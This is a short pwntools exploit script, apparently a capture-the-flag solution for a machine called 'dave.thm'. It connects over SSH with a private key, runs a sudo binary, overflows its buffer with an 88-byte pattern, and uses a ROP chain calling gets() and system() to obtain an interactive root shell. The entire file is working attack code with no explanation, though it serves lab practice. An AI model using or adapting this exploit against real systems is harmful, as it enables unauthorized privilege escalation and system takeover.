from pwn import *

cyclic_len = 88

payload = cyclic(cyclic_len)

payload += p64(0x400803)    # pop rdi; ret;
payload += p64(0x601000)    # .bss
payload += p64(0x4005b0)    # gets()
payload += p64(0x400803)    # pop rdi; ret;
payload += p64(0x601000)    # .bss
payload += p64(0x400570)    # system()

# swap dave.thm with the ip address if you don't have it set in /etc/hosts
s = ssh(host='dave.thm', user='dave', keyfile='./id_rsa')
p = s.process([ "sudo", "/uid_checker"])
# Wait for first input
p.recv()
p.sendline(payload)
# Wait for gets() in rop chain
p.recv()
p.sendline("/bin/sh")
# enter shell
p.interactive()